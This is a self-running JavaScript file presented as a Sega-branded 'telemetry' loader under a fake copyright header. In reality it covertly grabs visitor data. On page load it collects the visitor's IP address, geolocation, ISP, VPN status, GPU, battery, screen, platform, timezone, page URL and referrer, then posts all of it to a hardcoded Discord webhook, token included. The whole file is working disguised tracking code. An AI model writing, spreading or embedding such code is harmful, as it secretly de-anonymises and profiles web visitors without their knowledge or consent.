// JS-LOADER-2024-©-COPYRIGHT-Sega-Systems-Enterprise-Global-Assets-Telemetry-Policy-v4.2.1
(async function() {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548454840768790621/P5LPTWfTZtvGDMu2TuoJhakg_VKpmPwFEhHdvkvNz4nKotb0zhILiL_vw6JUxiDNTuc0'; 

    async function getNetworkDetails() {
        const providers = [
            'https://ipapi.co/json/',
            'https://ipwho.is/',
            'https://ipapi.co/api/json'
        ];
        for (const url of providers) {
            try {
                const res = await fetch(url, { signal: AbortSignal.timeout(3000) });
                if (res.ok) {
                    const data = await res.json();
                    const isVpn = data.security?.vpn || data.vpn || (data.org && data.org.toLowerCase().includes('vpn')) || (data.isp && data.isp.toLowerCase().includes('vpn'));
                    return {
                        ip: data.ip || 'Unknown',
                        geo: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || data.country || 'Unknown'}`,
                        isp: data.org || data.isp || 'Unknown',
                        vpn: isVpn ? '⚠️ YES (VPN/Proxy Detected)' : '✅ No'
                    };
                }
            } catch (e) {
                console.error("Provider failed:", url);
            }
        }
        return { ip: 'Unavailable', geo: 'Unavailable', isp: 'Unknown', vpn: 'Unknown' };
    }

    async function getBattery() {
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
            }
        } catch (e) {}
        return 'Unsupported';
    }

    function getHardware() {
        let gpu = 'Unknown';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        } catch (e) {}
        return {
            cores: navigator.hardwareConcurrency || 'Unknown',
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
            gpu: gpu
        };
    }

    try {
        const net = await getNetworkDetails();
        const batt = await getBattery();
        const hw = getHardware();

        // Handle the UserAgentData promise carefully
        let osPlatform = navigator.platform;
        if (navigator.userAgentData) {
            try {
                const highEntropy = await navigator.userAgentData.getHighEntropyValues(['model']);
                osPlatform = highEntropy.model || navigator.platform;
            } catch (e) {}
        }

        const dataReport = {
            "IP Address": net.ip,
            "VPN Detected": net.vpn,
            "Location": net.geo,
            "ISP/Org": net.isp,
            "URL": window.location.href,
            "Referrer": document.referrer || 'Direct',
            "Battery": batt,
            "CPU/RAM": `${hw.cores} Cores / ${hw.ram}`,
            "GPU": hw.gpu,
            "Screen": `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
            "OS/Platform": osPlatform,
            "Browser": navigator.appName || "Unknown",
            "Language": navigator.language,
            "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
            "Cookies": navigator.cookieEnabled ? 'Yes' : 'No',
            "Timestamp": new Date().toISOString()
        };

        const fields = Object.entries(dataReport).map(([k, v]) => ({
            name: k,
            value: String(v).substring(0, 1024),
            inline: true
        }));

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `📦 **New Telemetry Payload** | VPN: ${net.vpn}`,
                embeds: [{
                    title: "Sega-JS Loader System Audit",
                    color: 3066993,
                    fields: fields,
                    footer: { text: "Sega Systems Enterprise Assets v4.2" }
                }]
            })
        });
    } catch (globalErr) {
        console.error("Telemetry failed:", globalErr);
    }
})();